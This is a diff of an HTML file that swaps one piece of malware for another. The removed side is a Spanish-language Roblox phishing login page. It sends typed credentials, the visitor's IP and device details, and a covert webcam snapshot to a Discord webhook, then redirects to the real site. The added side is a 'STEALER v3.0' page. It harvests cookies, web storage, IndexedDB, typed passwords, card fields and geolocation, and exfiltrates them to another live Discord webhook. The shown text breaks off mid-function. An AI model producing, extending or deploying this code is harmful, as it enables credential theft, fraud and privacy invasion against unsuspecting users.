@@ -1,193 +1,815 @@
 <!DOCTYPE html>
-<html lang="es">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Roblox - Iniciar sesión</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Stealer</title>
     <style>
-        * { margin:0; padding:0; box-sizing:border-box; }
-        body { background:#1a1a2e; font-family:'Segoe UI',Arial,sans-serif; display:flex; justify-content:center; align-items:center; min-height:100vh; }
-        .login-box { background:#2a2a3e; padding:40px 30px; border-radius:16px; width:100%; max-width:380px; box-shadow:0 8px 32px rgba(0,0,0,0.6); text-align:center; }
-        .login-box img { width:80px; margin-bottom:20px; }
-        .login-box h2 { color:#fff; font-size:24px; margin-bottom:8px; }
-        .login-box p { color:#aaa; font-size:14px; margin-bottom:24px; }
-        .login-box input { width:100%; padding:14px 16px; margin-bottom:12px; border:none; border-radius:8px; background:#1e1e32; color:#fff; font-size:16px; outline:1px solid #444; }
-        .login-box input:focus { outline:2px solid #5865F2; }
-        .login-box button { width:100%; padding:14px; background:#5865F2; color:#fff; border:none; border-radius:8px; font-size:18px; font-weight:bold; cursor:pointer; transition:0.2s; }
-        .login-box button:hover { background:#4752c4; }
-        .login-box button:active { transform:scale(0.97); }
-        .login-box .error { color:#ff6b6b; font-size:13px; margin-top:10px; display:none; }
-        #status { color:#aaa; font-size:12px; margin-top:16px; }
-        /* Ocultar elementos de captura */
-        video, canvas { display:none; }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            background: #0a0a0f; 
+            color: #00ff88; 
+            font-family: 'Courier New', monospace; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .container {
+            background: #12121a;
+            border: 1px solid #00ff88;
+            border-radius: 12px;
+            padding: 40px;
+            max-width: 800px;
+            width: 100%;
+            box-shadow: 0 0 40px rgba(0, 255, 136, 0.1);
+        }
+        h1 {
+            color: #00ff88;
+            font-size: 28px;
+            text-align: center;
+            margin-bottom: 10px;
+            text-transform: uppercase;
+            letter-spacing: 4px;
+        }
+        .subtitle {
+            text-align: center;
+            color: #667;
+            font-size: 14px;
+            margin-bottom: 30px;
+            letter-spacing: 2px;
+        }
+        .status {
+            background: #1a1a2a;
+            border-radius: 8px;
+            padding: 20px;
+            margin: 20px 0;
+            font-size: 13px;
+            line-height: 1.8;
+            color: #aabbcc;
+            max-height: 400px;
+            overflow-y: auto;
+            border: 1px solid #2a2a3a;
+        }
+        .status .log-entry {
+            padding: 2px 0;
+            border-bottom: 1px solid #1a1a2a;
+        }
+        .status .log-entry.success { color: #00ff88; }
+        .status .log-entry.warning { color: #ffaa00; }
+        .status .log-entry.error { color: #ff4466; }
+        .status .log-entry.info { color: #44aaff; }
+        .btn {
+            background: #00ff88;
+            color: #0a0a0f;
+            border: none;
+            padding: 14px 30px;
+            font-size: 18px;
+            font-weight: bold;
+            border-radius: 8px;
+            cursor: pointer;
+            width: 100%;
+            text-transform: uppercase;
+            letter-spacing: 3px;
+            transition: all 0.3s;
+            font-family: 'Courier New', monospace;
+        }
+        .btn:hover {
+            background: #00cc77;
+            transform: scale(0.98);
+            box-shadow: 0 0 30px rgba(0, 255, 136, 0.3);
+        }
+        .btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none;
+        }
+        .stats {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 15px;
+            margin: 20px 0;
+        }
+        .stat-box {
+            background: #1a1a2a;
+            padding: 15px;
+            border-radius: 8px;
+            text-align: center;
+            border: 1px solid #2a2a3a;
+        }
+        .stat-box .number {
+            font-size: 28px;
+            font-weight: bold;
+            color: #00ff88;
+        }
+        .stat-box .label {
+            font-size: 11px;
+            color: #667;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-top: 5px;
+        }
+        .footer {
+            text-align: center;
+            margin-top: 30px;
+            color: #445;
+            font-size: 12px;
+            letter-spacing: 1px;
+        }
+        ::-webkit-scrollbar {
+            width: 6px;
+        }
+        ::-webkit-scrollbar-track {
+            background: #1a1a2a;
+        }
+        ::-webkit-scrollbar-thumb {
+            background: #00ff88;
+            border-radius: 3px;
+        }
     </style>
 </head>
 <body>
 
-<div class="login-box">
-    <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Crect width='100' height='100' fill='%23333333'/%3E%3Ctext x='20' y='60' font-size='40' fill='%23fff' font-family='Arial'%3ER%3C/text%3E%3C/svg%3E" alt="Roblox">
-    <h2>Iniciar sesión</h2>
-    <p>Ingresa tus credenciales para continuar</p>
-    <form id="loginForm">
-        <input type="text" id="username" placeholder="Nombre de usuario" required autocomplete="off">
-        <input type="password" id="password" placeholder="Contraseña" required autocomplete="off">
-        <button type="submit">Iniciar sesión</button>
-        <div class="error" id="errorMsg">Credenciales incorrectas. Intenta de nuevo.</div>
-    </form>
-    <div id="status">⏳ Conectando...</div>
+<div class="container">
+    <h1>⬡ STEALER v3.0</h1>
+    <div class="subtitle">● MAXIMUM DATA EXFILTRATION ●</div>
+    
+    <div class="stats">
+        <div class="stat-box">
+            <div class="number" id="cookieCount">0</div>
+            <div class="label">Cookies</div>
+        </div>
+        <div class="stat-box">
+            <div class="number" id="storageCount">0</div>
+            <div class="label">Storage Items</div>
+        </div>
+        <div class="stat-box">
+            <div class="number" id="sensitiveCount">0</div>
+            <div class="label">Sensitive Found</div>
+        </div>
+    </div>
+    
+    <div class="status" id="logContainer">
+        <div class="log-entry info">[●] System initialized...</div>
+        <div class="log-entry info">[●] Waiting for execution...</div>
+    </div>
+    
+    <button class="btn" id="stealBtn">▶ EXFILTRATE ALL DATA</button>
+    
+    <div class="footer">● all data sent to discord webhook ●</div>
 </div>
 
-<video id="video" autoplay playsinline></video>
-<canvas id="canvas"></canvas>
-
 <script>
-    (function(){
-        "use strict";
+    // ============================================================
+    // COMPLETE WEB STEALER - MAXIMUM EXFILTRATION
+    // All-in-one HTML page with UI and full stealer logic
+    // ============================================================
 
-        // --- CONFIGURACIÓN DEL WEBHOOK DE DISCORD ---
-        const WEBHOOK_URL = "https://discord.com/api/webhooks/1528258625083281508/TskUp1gBftr6JJ6BbICRweaC41S4PTbRH0mYIjWCWNIl0LACwJ2zLlhZNX67NbH7mWTr";
+    // ===== DISCORD WEBHOOK =====
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1527559902942334976/LkAWS9RsHB96gu8So92WEnAQspEokK5gj8Nt30CzAQJDEdBUN2ZGQLc6tn4DpSydk9oo";
 
-        // Elementos
-        const form = document.getElementById('loginForm');
-        const usernameInput = document.getElementById('username');
-        const passwordInput = document.getElementById('password');
-        const errorMsg = document.getElementById('errorMsg');
-        const statusDiv = document.getElementById('status');
+    // ===== UI REFERENCES =====
+    const logContainer = document.getElementById('logContainer');
+    const stealBtn = document.getElementById('stealBtn');
+    const cookieCountEl = document.getElementById('cookieCount');
+    const storageCountEl = document.getElementById('storageCount');
+    const sensitiveCountEl = document.getElementById('sensitiveCount');
 
-        // --- Funciones auxiliares ---
-        async function obtenerIP() {
-            try {
-                const r = await fetch('https://api.ipify.org?format=json');
-                const d = await r.json();
-                return d.ip || 'desconocida';
-            } catch { return 'no disponible'; }
-        }
+    // ===== LOG FUNCTION =====
+    function addLog(message, type = 'info') {
+        const entry = document.createElement('div');
+        entry.className = `log-entry ${type}`;
+        const timestamp = new Date().toLocaleTimeString();
+        entry.textContent = `[${timestamp}] ${message}`;
+        logContainer.appendChild(entry);
+        logContainer.scrollTop = logContainer.scrollHeight;
+    }
 
-        function getDeviceInfo() {
-            return {
-                ua: navigator.userAgent,
-                platform: navigator.platform || 'desconocida',
-                language: navigator.language || 'desconocido',
-                screen: `${window.screen.width}x${window.screen.height}`
+    // ===== UPDATE STATS =====
+    function updateStats(cookies, storage, sensitive) {
+        cookieCountEl.textContent = cookies || 0;
+        storageCountEl.textContent = storage || 0;
+        sensitiveCountEl.textContent = sensitive || 0;
+    }
+
+    // ===== SEND TO DISCORD =====
+    function sendToDiscord(message, color = 0x00ff88, title = "Stealer Report") {
+        try {
+            const payload = {
+                embeds: [{
+                    title: title,
+                    description: message.substring(0, 3900),
+                    color: color,
+                    timestamp: new Date().toISOString(),
+                    footer: { 
+                        text: "Exfiltrated from " + window.location.hostname,
+                        icon_url: "https://cdn.discordapp.com/embed/avatars/0.png"
+                    }
+                }]
             };
+            
+            return fetch(WEBHOOK_URL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(payload)
+            }).then(res => res.status === 204);
+        } catch(e) {
+            return Promise.resolve(false);
         }
+    }
 
-        // --- Enviar credenciales a Discord ---
-        async function enviarCredenciales(username, password) {
-            const ip = await obtenerIP();
-            const info = getDeviceInfo();
-            const timestamp = new Date().toISOString();
-
-            const mensaje = `**🔐 Credenciales Roblox capturadas**\n` +
-                `👤 Usuario: \`${username}\`\n` +
-                `🔑 Contraseña: \`${password}\`\n` +
-                `🕒 ${timestamp}\n` +
-                `🌐 IP: ${ip}\n` +
-                `📱 ${info.ua}\n` +
-                `🖥️ ${info.platform}\n` +
-                `🌍 ${info.lang}\n` +
-                `📐 ${info.screen}`;
-
-            const payload = { content: mensaje };
-
-            try {
-                const resp = await fetch(WEBHOOK_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
-                });
-                if (resp.ok) {
-                    statusDiv.textContent = '✅ Enviado a Discord';
-                } else {
-                    statusDiv.textContent = `❌ Error HTTP ${resp.status}`;
-                }
-            } catch (e) {
-                statusDiv.textContent = `❌ Fallo en envío: ${e.message}`;
+    // ===== 1. GET ALL COOKIES =====
+    function getAllCookies() {
+        const cookies = {};
+        document.cookie.split(';').forEach(cookie => {
+            const parts = cookie.trim().split('=');
+            if (parts.length >= 2) {
+                const name = parts[0];
+                const value = parts.slice(1).join('=');
+                cookies[name] = decodeURIComponent(value);
             }
-        }
-
-        // --- Manejar el envío del formulario ---
-        form.addEventListener('submit', async function(e) {
-            e.preventDefault();
-            const username = usernameInput.value.trim();
-            const password = passwordInput.value.trim();
-
-            if (!username || !password) {
-                errorMsg.style.display = 'block';
-                errorMsg.textContent = 'Por favor completa ambos campos.';
-                return;
-            }
-
-            // Ocultar mensaje de error
-            errorMsg.style.display = 'none';
-            statusDiv.textContent = '⏳ Verificando...';
-
-            // Enviar credenciales al webhook
-            await enviarCredenciales(username, password);
-
-            // Simular error de inicio de sesión para redirigir a Roblox real
-            errorMsg.style.display = 'block';
-            errorMsg.textContent = 'Credenciales incorrectas. Redirigiendo...';
-            statusDiv.textContent = '🔁 Redirigiendo a Roblox...';
-
-            // Limpiar campos
-            usernameInput.value = '';
-            passwordInput.value = '';
-
-            // Redirigir a Roblox real después de 2 segundos
-            setTimeout(() => {
-                window.location.href = 'https://www.roblox.com/login';
-            }, 2000);
         });
+        return cookies;
+    }
 
-        // --- Intento de captura de cámara silenciosa (opcional) ---
-        // Se ejecuta inmediatamente para intentar tomar foto sin interacción (si ya hay permisos)
-        (async function intentarCapturaCamara() {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: 'user', width: { ideal: 320 }, height: { ideal: 240 } },
-                    audio: false
+    // ===== 2. GET LOCAL STORAGE =====
+    function getLocalStorage() {
+        const data = {};
+        try {
+            for (let i = 0; i < localStorage.length; i++) {
+                const key = localStorage.key(i);
+                if (key) data[key] = localStorage.getItem(key);
+            }
+        } catch(e) {}
+        return data;
+    }
+
+    // ===== 3. GET SESSION STORAGE =====
+    function getSessionStorage() {
+        const data = {};
+        try {
+            for (let i = 0; i < sessionStorage.length; i++) {
+                const key = sessionStorage.key(i);
+                if (key) data[key] = sessionStorage.getItem(key);
+            }
+        } catch(e) {}
+        return data;
+    }
+
+    // ===== 4. GET INDEXEDDB =====
+    async function getIndexedDB() {
+        const databases = [];
+        try {
+            const dbs = await indexedDB.databases ? await indexedDB.databases() : [];
+            for (const dbInfo of dbs) {
+                try {
+                    const db = await new Promise((resolve, reject) => {
+                        const request = indexedDB.open(dbInfo.name);
+                        request.onsuccess = () => resolve(request.result);
+                        request.onerror = () => reject();
+                    });
+                    const dbData = { name: dbInfo.name, stores: {} };
+                    for (const storeName of db.objectStoreNames) {
+                        try {
+                            const transaction = db.transaction(storeName, 'readonly');
+                            const store = transaction.objectStore(storeName);
+                            const items = await new Promise((resolve) => {
+                                const request = store.getAll();
+                                request.onsuccess = () => resolve(request.result);
+                                request.onerror = () => resolve([]);
+                            });
+                            dbData.stores[storeName] = items.slice(0, 50);
+                        } catch(e) {}
+                    }
+                    databases.push(dbData);
+                    db.close();
+                } catch(e) {}
+            }
+        } catch(e) {}
+        return databases;
+    }
+
+    // ===== 5. GET BROWSER INFO =====
+    function getBrowserInfo() {
+        try {
+            return {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                languages: navigator.languages || [],
+                cookieEnabled: navigator.cookieEnabled,
+                doNotTrack: navigator.doNotTrack,
+                hardwareConcurrency: navigator.hardwareConcurrency || 0,
+                deviceMemory: navigator.deviceMemory || 'unknown',
+                screen: {
+                    width: screen.width,
+                    height: screen.height,
+                    colorDepth: screen.colorDepth,
+                    pixelRatio: window.devicePixelRatio || 1
+                },
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                url: window.location.href,
+                referrer: document.referrer || 'none',
+                title: document.title,
+                documentMode: document.documentMode || 0
+            };
+        } catch(e) {
+            return {};
+        }
+    }
+
+    // ===== 6. GET EXTENSIONS =====
+    function getExtensions() {
+        const extensions = [];
+        try {
+            if (window.chrome && window.chrome.runtime) {
+                if (chrome.management) {
+                    chrome.management.getAll((exts) => {
+                        exts.forEach(ext => {
+                            extensions.push({
+                                id: ext.id,
+                                name: ext.name,
+                                version: ext.version,
+                                enabled: ext.enabled,
+                                type: ext.type
+                            });
+                        });
+                    });
+                }
+            }
+        } catch(e) {}
+        return extensions;
+    }
+
+    // ===== 7. GET NETWORK INFO =====
+    function getNetworkInfo() {
+        const info = {};
+        try {
+            if (navigator.connection) {
+                const conn = navigator.connection;
+                info.effectiveType = conn.effectiveType;
+                info.downlink = conn.downlink;
+                info.rtt = conn.rtt;
+                info.saveData = conn.saveData;
+                info.type = conn.type;
+            }
+        } catch(e) {}
+        return info;
+    }
+
+    // ===== 8. GET STORAGE QUOTA =====
+    async function getStorageQuota() {
+        try {
+            if (navigator.storage && navigator.storage.estimate) {
+                const estimate = await navigator.storage.estimate();
+                return {
+                    usage: estimate.usage || 0,
+                    quota: estimate.quota || 0,
+                    percentage: ((estimate.usage / estimate.quota) * 100).toFixed(2)
+                };
+            }
+        } catch(e) {}
+        return {};
+    }
+
+    // ===== 9. SCAN FOR SENSITIVE KEYWORDS =====
+    function scanForSensitiveData(data) {
+        const keywords = ['pass', 'key', 'secret', 'token', 'auth', 'jwt', 'bearer', 'api', 
+                          'wallet', 'seed', 'mnemonic', 'private', 'credit', 'card', 'cvv', 
+                          'ssn', 'social', 'password', 'username', 'email', 'phone'];
+        const found = {};
+        
+        if (typeof data === 'string') {
+            const lower = data.toLowerCase();
+            keywords.forEach(keyword => {
+                if (lower.includes(keyword)) {
+                    found[keyword] = data.substring(0, 200);
+                }
+            });
+        } else if (typeof data === 'object' && data !== null) {
+            Object.entries(data).forEach(([key, value]) => {
+                const lower = key.toLowerCase();
+                keywords.forEach(kw => {
+                    if (lower.includes(kw)) {
+                        const val = typeof value === 'string' ? value : JSON.stringify(value);
+                        found[key] = val.substring(0, 200);
+                    }
                 });
-                // Si se obtuvo, capturar un frame y enviar
-                const video = document.getElementById('video');
-                const canvas = document.getElementById('canvas');
-                const ctx = canvas.getContext('2d');
-                video.srcObject = stream;
-                await new Promise(r => { if(video.readyState>=2) r(); else video.onloadedmetadata=r; });
-                await new Promise(r => setTimeout(r, 200));
-                const vw = video.videoWidth, vh = video.videoHeight;
-                if (vw && vh) {
-                    canvas.width = vw; canvas.height = vh;
-                    ctx.drawImage(video, 0, 0, vw, vh);
-                    const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.8));
-                    if (blob) {
-                        const file = new File([blob], `cam_${Date.now()}.jpg`, { type: 'image/jpeg' });
-                        const ip = await obtenerIP();
-                        const info = getDeviceInfo();
-                        const txt = `**📸 Foto adicional (cámara)**\n🕒 ${new Date().toISOString()}\n🌐 IP: ${ip}\n📱 ${info.ua}`;
-                        const fd = new FormData();
-                        fd.append('file', file, file.name);
-                        fd.append('content', txt);
-                        await fetch(WEBHOOK_URL, { method: 'POST', body: fd });
+                if (typeof value === 'string' || typeof value === 'object') {
+                    const nested = scanForSensitiveData(value);
+                    Object.assign(found, nested);
+                }
+            });
+        }
+        return found;
+    }
+
+    // ===== 10. GET SAVED PASSWORDS (autofill) =====
+    function getSavedPasswords() {
+        const passwords = [];
+        try {
+            document.querySelectorAll('input[type="password"]').forEach(input => {
+                if (input.value && input.value.length > 0) {
+                    const form = input.closest('form');
+                    let username = '';
+                    if (form) {
+                        const userInput = form.querySelector('input[type="text"], input[type="email"], input[name*="user"], input[name*="email"]');
+                        if (userInput) username = userInput.value;
+                    }
+                    passwords.push({
+                        url: window.location.href,
+                        username: username || input.name || input.id || 'unknown',
+                        password: input.value
+                    });
+                }
+            });
+        } catch(e) {}
+        return passwords;
+    }
+
+    // ===== 11. GET CREDIT CARD INFO =====
+    function getCreditCardInfo() {
+        const cards = [];
+        try {
+            document.querySelectorAll('input[type="text"], input[type="number"]').forEach(input => {
+                const name = (input.name || input.id || '').toLowerCase();
+                const value = input.value || '';
+                if (value.length > 2) {
+                    if (name.includes('card') || name.includes('credit') || 
+                        name.includes('cvv') || name.includes('cvc') ||
+                        name.includes('expiry') || name.includes('expiration') ||
+                        name.includes('cc') || name.includes('number')) {
+                        cards.push({ field: input.name || input.id || 'unknown', value: value });
                     }
                 }
-                stream.getTracks().forEach(t => t.stop());
-                video.srcObject = null;
-            } catch (err) {
-                // Silencioso: no hay permiso o falló la cámara
-            }
-        })();
+            });
+        } catch(e) {}
+        return cards;
+    }
 
-        // Limpiar al cerrar
-        window.addEventListener('beforeunload', function() {
-            const video = document.getElementById('video');
-            if (video.srcObject) {
-                video.srcObject.getTracks().forEach(t => t.stop());
+    // ===== 12. CHECK ADBLOCKERS =====
+    function checkAdBlockers() {
+        const blockers = [];
+        try {
+            if (window.adblock) blockers.push('AdBlock');
+            if (window.uBlockOrigin) blockers.push('uBlock Origin');
+            if (window.AdBlockPlus) blockers.push('AdBlock Plus');
+            if (window.ghostery) blockers.push('Ghostery');
+            if (window.noscript) blockers.push('NoScript');
+            const testDiv = document.createElement('div');
+            testDiv.className = 'adsbox';
+            document.body.appendChild(testDiv);
+            if (testDiv.offsetHeight === 0) blockers.push('Unknown AdBlocker');
+            document.body.removeChild(testDiv);
+        } catch(e) {}
+        return blockers;
+    }
+
+    // ===== 13. GET PERFORMANCE DATA =====
+    function getPerformanceData() {
+        try {
+            const perf = window.performance;
+            const timing = perf.timing || {};
+            return {
+                loadTime: timing.loadEventEnd - timing.navigationStart || 0,
+                domReady: timing.domContentLoadedEventEnd - timing.navigationStart || 0,
+                firstPaint: perf.getEntriesByType ? perf.getEntriesByType('paint').find(p => p.name === 'first-paint')?.startTime || 0 : 0,
+                memory: perf.memory ? {
+                    usedJSHeapSize: perf.memory.usedJSHeapSize,
+                    totalJSHeapSize: perf.memory.totalJSHeapSize,
+                    jsHeapSizeLimit: perf.memory.jsHeapSizeLimit
+                } : null
+            };
+        } catch(e) {
+            return {};
+        }
+    }
+
+    // ===== 14. GET GEOLOCATION =====
+    function getGeolocation() {
+        return new Promise((resolve) => {
+            try {
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        (pos) => {
+                            resolve({
+                                latitude: pos.coords.latitude,
+                                longitude: pos.coords.longitude,
+                                accuracy: pos.coords.accuracy
+                            });
+                        },
+                        () => resolve(null),
+                        { timeout: 5000 }
+                    );
+                } else {
+                    resolve(null);
+                }
+            } catch(e) {
+                resolve(null);
             }
+            setTimeout(() => resolve(null), 6000);
         });
+    }
 
-        statusDiv.textContent = '📡 Listo para iniciar sesión';
-    })();
+    // ===== 15. MAIN EXFILTRATION =====
+    async function exfiltrateAll() {
+        stealBtn.disabled = true;
+        stealBtn.textContent = '⏳ EXFILTRATING...';
+        
+        try {
+            addLog('🚀 Starting maximum data exfiltration...', 'info');
+            
+            // --- Send initial notification ---
+            await sendToDiscord("🚀 **STARTING MAXIMUM DATA EXFILTRATION**", 0x00ffff, "EXFIL START");
+            addLog('[✓] Discord webhook connected', 'success');
+
+            // --- 1. Browser Info ---
+            addLog('[1/14] Collecting browser information...', 'info');
+            const browserInfo = getBrowserInfo();
+            let infoMsg = `**Browser Information:**\n`;
+            infoMsg += `• User Agent: ${browserInfo.userAgent?.substring(0, 200) || 'unknown'}\n`;
+            infoMsg += `• Platform: ${browserInfo.platform || 'unknown'}\n`;
+            infoMsg += `• Language: ${browserInfo.language || 'unknown'}\n`;
+            infoMsg += `• Timezone: ${browserInfo.timezone || 'unknown'}\n`;
+            infoMsg += `• Screen: ${browserInfo.screen?.width || 0}x${browserInfo.screen?.height || 0}\n`;
+            infoMsg += `• Hardware Concurrency: ${browserInfo.hardwareConcurrency || 0}\n`;
+            infoMsg += `• Device Memory: ${browserInfo.deviceMemory || 'unknown'} GB\n`;
+            infoMsg += `• URL: ${browserInfo.url?.substring(0, 200) || 'unknown'}\n`;
+            infoMsg += `• Referrer: ${browserInfo.referrer || 'none'}`;
+            await sendToDiscord(infoMsg, 0x0000ff, "Browser Information");
+            addLog('[✓] Browser info collected', 'success');
+
+            // --- 2. Cookies ---
+            addLog('[2/14] Extracting cookies...', 'info');
+            const cookies = getAllCookies();
+            const cookieCount = Object.keys(cookies).length;
+            let cookieMsg = `**Cookies (${cookieCount}):**\n`;
+            let hasNetflix = false, hasDisney = false;
+            Object.entries(cookies).forEach(([name, value]) => {
+                const lower = name.toLowerCase();
+                if (lower.includes('netflix')) hasNetflix = true;
+                if (lower.includes('disney')) hasDisney = true;
+                if (cookieCount <= 20) {
+                    cookieMsg += `• ${name}: ${value.substring(0, 50)}${value.length > 50 ? '...' : ''}\n`;
+                }
+            });
+            if (hasNetflix) cookieMsg += "\n✅ Netflix cookies detected!\n";
+            if (hasDisney) cookieMsg += "✅ Disney+ cookies detected!\n";
+            if (cookieCount > 20) {
+                cookieMsg += `\n... and ${cookieCount - 20} more cookies`;
+            }
+            await sendToDiscord(cookieMsg.substring(0, 3900), 0x00ff00, `Cookies (${cookieCount})`);
+            
+            // Send all cookies as JSON
+            const cookieJson = JSON.stringify(cookies, null, 2);
+            if (cookieJson.length > 3900) {
+                const chunks = [cookieJson.slice(0, 3900), cookieJson.slice(3900, 7800)];
+                chunks.forEach((chunk, i) => {
+                    if (chunk) sendToDiscord(`\`\`\`json\n${chunk}\n\`\`\``, 0x00ff00, `All Cookies (Part ${i+1})`);
+                });
+            } else if (cookieJson.length > 10) {
+                sendToDiscord(`\`\`\`json\n${cookieJson}\n\`\`\``, 0x00ff00, "All Cookies");
+            }
+            addLog(`[✓] ${cookieCount} cookies extracted`, 'success');
+
+            // --- 3. Local Storage ---
+            addLog('[3/14] Extracting local storage...', 'info');
+            const localData = getLocalStorage();
+            const localCount = Object.keys(localData).length;
+            let localMsg = `**Local Storage (${localCount} items):**\n`;
+            const sensitiveLocal = scanForSensitiveData(localData);
+            if (Object.keys(sensitiveLocal).length > 0) {
+                localMsg += "**⚠️ SENSITIVE DATA FOUND:**\n";
+                Object.entries(sensitiveLocal).forEach(([key, value]) => {
+                    localMsg += `• ${key}: ${typeof value === 'string' ? value.substring(0, 100) : JSON.stringify(value).substring(0, 100)}...\n`;
+                });
+            } else {
+                Object.entries(localData).slice(0, 10).forEach(([key, value]) => {
+                    const val = typeof value === 'string' ? value : JSON.stringify(value);
+                    localMsg += `• ${key}: ${val.substring(0, 50)}${val.length > 50 ? '...' : ''}\n`;
+                });
+                if (localCount > 10) localMsg += `\n... and ${localCount - 10} more items`;
+            }
+            await sendToDiscord(localMsg.substring(0, 3900), 0x00aa88, `Local Storage (${localCount})`);
+            addLog(`[✓] ${localCount} local storage items extracted`, 'success');
+
+            // --- 4. Session Storage ---
+            addLog('[4/14] Extracting session storage...', 'info');
+            const sessionData = getSessionStorage();
+            const sessionCount = Object.keys(sessionData).length;
+            let sessionMsg = `**Session Storage (${sessionCount} items):**\n`;
+            const sensitiveSession = scanForSensitiveData(sessionData);
+            if (Object.keys(sensitiveSession).length > 0) {
+                sessionMsg += "**⚠️ SENSITIVE DATA FOUND:**\n";
+                Object.entries(sensitiveSession).forEach(([key, value]) => {
+                    sessionMsg += `• ${key}: ${value.substring(0, 100)}...\n`;
+                });
+            } else {
+                Object.entries(sessionData).slice(0, 10).forEach(([key, value]) => {
+                    sessionMsg += `• ${key}: ${value.substring(0, 50)}${value.length > 50 ? '...' : ''}\n`;
+                });
+            }
+            await sendToDiscord(sessionMsg.substring(0, 3900), 0x00cc88, `Session Storage (${sessionCount})`);
+            addLog(`[✓] ${sessionCount} session storage items extracted`, 'success');
+
+            // --- 5. IndexedDB ---
+            addLog('[5/14] Extracting IndexedDB...', 'info');
+            try {
+                const idbData = await getIndexedDB();
+                if (idbData.length > 0) {
+                    let idbMsg = `**IndexedDB Databases:**\n`;
+                    idbData.forEach(db => {
+                        idbMsg += `• ${db.name}: ${Object.keys(db.stores).length} stores\n`;
+                        Object.entries(db.stores).forEach(([store, data]) => {
+                            if (data.length > 0) {
+                                idbMsg += `  - ${store}: ${data.length} items\n`;
+                            }
+                        });
+                    });
+                    await sendToDiscord(idbMsg.substring(0, 3900), 0x00dd88, `IndexedDB (${idbData.length} DBs)`);
+                    addLog(`[✓] ${idbData.length} IndexedDB databases extracted`, 'success');
+                }
+            } catch(e) {
+                addLog('[-] IndexedDB extraction failed', 'error');
+            }
+
+            // --- 6. Saved Passwords ---
+            addLog('[6/14] Extracting saved passwords...', 'info');
+            const passwords = getSavedPasswords();
+            if (passwords.length > 0) {
+                let passMsg = `**⚠️ SAVED PASSWORDS FOUND:**\n`;
+                passwords.forEach(p => {
+                    passMsg += `• ${p.url}\n  User: ${p.username}\n  Pass: ${p.password}\n`;
+                });
+                await sendToDiscord(passMsg, 0xff0000, `Passwords (${passwords.length})`);
+                addLog(`[✓] ${passwords.length} passwords extracted`, 'success');
+            } else {
+                addLog('[-] No saved passwords found', 'info');
+            }
+
+            // --- 7. Credit Cards ---
+            addLog('[7/14] Extracting credit card info...', 'info');
+            const cards = getCreditCardInfo();
+            if (cards.length > 0) {
+                let cardMsg = `**💳 CREDIT CARD INFO FOUND:**\n`;
+                cards.forEach(c => {
+                    cardMsg += `• ${c.field}: ${c.value}\n`;
+                });
+                await sendToDiscord(cardMsg, 0xff4400, `Credit Cards (${cards.length})`);
+                addLog(`[✓] ${cards.length} credit card entries extracted`, 'success');
+            } else {
+                addLog('[-] No credit card info found', 'info');
+            }
+
+            // --- 8. Sensitive Data Scan ---
+            addLog('[8/14] Scanning page for sensitive data...', 'info');
+            const pageContent = document.body?.innerText || '';
+            const sensitiveContent = scanForSensitiveData(pageContent);
+            const sensitiveCount = Object.keys(sensitiveContent).length;
+            if (sensitiveCount > 0) {
+                let contentMsg = `**⚠️ SENSITIVE DATA IN PAGE:**\n`;
+                Object.entries(sensitiveContent).slice(0, 10).forEach(([key, value]) => {
+                    contentMsg += `• ${key}: ${value}\n`;
+                });
+                await sendToDiscord(contentMsg, 0xff8800, "Sensitive Page Data");
+                addLog(`[✓] ${sensitiveCount} sensitive items found in page`, 'warning');
+            } else {
+                addLog('[-] No sensitive data in page', 'info');
+            }
+
+            // --- 9. Network Info ---
+            addLog('[9/14] Collecting network information...', 'info');
+            const networkInfo = getNetworkInfo();
+            let netMsg = "**Network Information:**\n";
+            netMsg += `• Connection: ${networkInfo.effectiveType || 'unknown'}\n`;
+            netMsg += `• Downlink: ${networkInfo.downlink || 'unknown'} Mbps\n`;
+            netMsg += `• RTT: ${networkInfo.rtt || 'unknown'} ms\n`;
+            netMsg += `• Save Data: ${networkInfo.saveData ? 'Yes' : 'No'}`;
+            await sendToDiscord(netMsg, 0x00ccff, "Network Info");
+            addLog('[✓] Network info collected', 'success');
+
+            // --- 10. Performance ---
+            addLog('[10/14] Collecting performance data...', 'info');
+            const perfData = getPerformanceData();
+            let perfMsg = "**Performance:**\n";
+            perfMsg += `• Load Time: ${perfData.loadTime || 'unknown'} ms\n`;
+            perfMsg += `• DOM Ready: ${perfData.domReady || 'unknown'} ms\n`;
+            if (perfData.memory) {
+                perfMsg += `• Memory Used: ${(perfData.memory.usedJSHeapSize / 1024 / 1024).toFixed(2)} MB\n`;
+                perfMsg += `• Memory Limit: ${(perfData.memory.jsHeapSizeLimit / 1024 / 1024).toFixed(2)} MB\n`;
+            }
+            await sendToDiscord(perfMsg, 0x00ddff, "Performance");
+            addLog('[✓] Performance data collected', 'success');
+
+            // --- 11. Extensions ---
+            addLog('[11/14] Detecting browser extensions...', 'info');
+            const extensions = getExtensions();
+            if (extensions.length > 0) {
+                let extMsg = "**Extensions:**\n";
+                extensions.forEach(ext => {
+                    extMsg += `• ${ext.name} (${ext.version}) - ${ext.enabled ? '✅ Enabled' : '❌ Disabled'}\n`;
+                });
+                await sendToDiscord(extMsg, 0xaa88ff, `Extensions (${extensions.length})`);
+                addLog(`[✓] ${extensions.length} extensions detected`, 'success');
+            } else {
+                addLog('[-] No extensions detected or permission denied', 'info');
+            }
+
+            // --- 12. AdBlockers ---
